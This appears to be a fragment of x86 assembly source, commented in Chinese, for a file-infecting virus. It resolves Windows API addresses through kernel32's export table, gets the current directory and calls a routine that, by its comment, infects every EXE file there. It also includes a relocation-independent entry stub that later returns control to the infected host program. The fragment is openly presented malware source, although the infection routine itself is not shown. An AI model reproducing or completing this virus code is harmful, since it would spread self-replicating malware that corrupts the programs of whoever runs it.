    ;使用GetProcAddress函数的首址，传入两个参数调用GetProcAddress函数，获得CreateDirA的首址
    mov eax,offset szCreateDir
    add eax,ebx
    invoke _getProcAddress,hKernel32Base,eax
    mov _createDir,eax
    
    ;调用创建目录的函数
    mov eax,offset szDir
    add eax,ebx
    invoke _createDir,eax,NULL

    ;开始我们的快乐之旅途

    lea edi,[ebx+lpFunAddress]
    lea esi,[ebx+szFunNames]
    ;从kernel的导出表获取所有相关API的入口地址
    call _getAllAPIs

    ;获取当前目录
    lea edi,[ebx+OriginDir]
    push edi
    push 7Fh
    call [ebx+_GetCurrentDirectoryA]
    ;感染当前目录的所有EXE文件
    call _infectItAll

    popad
    ret
_start  endp

; EXE文件新的入口地址

_NewEntry:
    ;取当前函数的堆栈栈顶值
    mov eax,dword ptr [esp]
    push eax
    call @F   ; 免去重定位
@@:
    pop ebx
    sub ebx,offset @B
    pop eax
    invoke _start
    jmpToStart   db 0E9h,0F0h,0FFh,0FFh,0FFh
    ret
vir_end equ this byte
    end _NewEntry